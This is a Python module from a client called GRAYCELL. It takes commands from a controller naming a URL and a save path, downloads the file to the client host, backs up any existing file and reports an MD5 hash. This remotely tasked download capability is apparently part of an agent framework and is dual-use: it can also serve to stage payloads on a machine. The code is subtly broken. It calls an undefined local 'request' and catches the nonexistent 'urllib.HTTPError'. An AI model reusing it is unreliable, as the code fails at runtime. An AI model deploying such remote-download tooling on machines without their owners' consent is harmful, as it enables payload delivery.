"""
File: GC_CModule_DownloadFile.py
ModuleID: download
Command Structure:
	url: String - where to download from
	saveas: String - where to save files (non-absolute paths will be relative to the GRAYCELL directory)

Response Structure:
	startTime: String - ISO Date of task starting
	MD5: String - MD5 of the downloaded file
	ERROR: String - Errors
"""
from GC_CModule import GC_CModule
import GC_Utility
#import urllib2
import urllib.request, urllib.parse, urllib.error
import hashlib
import os
import shutil
import ssl
import http.client
import logging

# Setup Logging:
LoggerName = 'gcclient.module.'+__name__
logger = logging.getLogger(LoggerName)
logger.setLevel(logging.DEBUG)

class GC_CModule_DownloadFile(GC_CModule):
	MODULE_ID = 'download'
	
	def __init__(self, gcclient):
		self.gcclient = gcclient
		logger.debug('Initialize Module: %s', self.MODULE_ID)
		# httplib.HTTPConnection.debuglevel = 1 

	"""
	Function: handleTask
	Description: handle download commands
	"""
	def handleTask(self, gccommand) :
		#self.gcclient.log(GC_Utility.DEBUG, "handleTask :: [x] " + gccommand[GC_Utility.GC_TASKREF])
		logger.debug('TaskRef: ' + gccommand[GC_Utility.GC_TASKREF])
		
		# Initialize response object 
		startTime =  GC_Utility.currentZuluDT()
		response = {}
		response['startTime'] = startTime
		
		# Initialize local variables
		taskingObj = gccommand[GC_Utility.GC_CMD_DATA]
		request = request(taskingObj['url'])
		saveas = taskingObj['saveas']
		
		#self.gcclient.log(GC_Utility.DEBUG, 'downloadFile: [%s as %s]' % (taskingObj['url'], taskingObj['saveas']))
		logger.debug('downloadFile: [%s as %s]' % (taskingObj['url'], taskingObj['saveas']))
		
		# Check for existing file, move it to back up
		GC_Utility.handleBackup(saveas, self.gcclient)
		
		try:
			# Download the file
			f = urllib.request.urlopen(request)
			data = f.read()
			
			# Save the file
			with open(saveas, "wb") as code:
				code.write(data)
		
			# Send the file hash back
			response['MD5'] = hashlib.md5(open(saveas, 'rb').read()).hexdigest()
			
		# Connection errors are recorded into the response
		except urllib.HTTPError as e:
			response['ERROR'] = "HTTP Error " + str(e.code)
		
		#self.gcclient.log(GC_Utility.DEBUG, 'downloadFile : Sending result...');
		logger.debug('downloadFile : Sending result...')
		self.gcclient.sendResult(gccommand, response);
	
	def getModuleId(self):
		return self.MODULE_ID
	
	def quit(self):
		return True
